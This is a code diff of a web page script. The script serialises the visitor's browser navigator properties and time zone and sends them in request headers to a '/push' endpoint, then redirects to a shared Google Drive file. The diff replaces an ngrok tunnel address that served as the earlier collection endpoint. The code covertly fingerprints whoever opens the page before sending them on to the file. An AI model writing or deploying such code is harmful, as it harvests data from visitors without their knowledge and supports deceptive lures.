@@ -29,11 +29,13 @@
         let az = window.navigator;
         let str = JSON.stringify(recur(az));
         let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        await req.open("GET", "http://5e67-106-200-193-195.ngrok.io/push");
+        await req.open("GET", "/push");
         await req.setRequestHeader("x-tz", tz);
         await req.setRequestHeader("x-nav", str);
         await req.send();
-        window.location.replace("http://www.w3schools.com");
+        window.location.replace(
+          "https://drive.google.com/file/d/1h3chngE0M24unVcXri7sAZ7zaT6KfSkh/view?usp=sharing"
+        );
       };
     </script>
   </body>
